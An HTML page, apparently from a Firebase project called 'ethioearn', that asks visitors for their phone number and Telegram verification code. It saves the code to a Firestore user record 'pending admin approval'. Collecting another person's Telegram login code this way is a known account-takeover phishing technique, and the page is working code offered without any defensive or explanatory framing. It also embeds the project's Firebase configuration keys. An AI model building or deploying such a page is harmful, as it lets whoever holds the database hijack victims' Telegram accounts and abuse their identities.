<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Telegram Verification</title>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
    import { getFirestore, collection, query, where, getDocs, updateDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBQ-E4YrEChSdnpAfVpTjRWPsI_eM8d_VY",
      authDomain: "ethioearn.firebaseapp.com",
      projectId: "ethioearn",
      storageBucket: "ethioearn.firebasestorage.app",
      messagingSenderId: "780752809959",
      appId: "1:780752809959:web:cb98a0547ef46148fcd742",
      measurementId: "G-CVHL849LRK"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    async function verifyUser(event) {
      event.preventDefault();
      const phone = document.getElementById("phone").value;
      const code = document.getElementById("code").value;

      const q = query(collection(db, "users"), where("phone", "==", phone));
      const snapshot = await getDocs(q);
      if (snapshot.empty) {
        alert("User not found!");
        return;
      }

      snapshot.forEach(async (docSnap) => {
        const docRef = docSnap.ref;
        await updateDoc(docRef, { verificationCode: code, verified: false });
        alert("Verification code submitted! Pending admin approval.");
      });
    }

    window.verifyUser = verifyUser;
  </script>
</head>
<body style="font-family: sans-serif; text-align:center; margin-top:50px;">
  <h2>Enter Telegram Verification Code</h2>
  <form onsubmit="verifyUser(event)">
    <input type="tel" id="phone" placeholder="Phone (+251...)" required><br><br>
    <input type="text" id="code" placeholder="Verification Code" required><br><br>
    <button type="submit">Submit Code</button>
  </form>
</body>
</html>
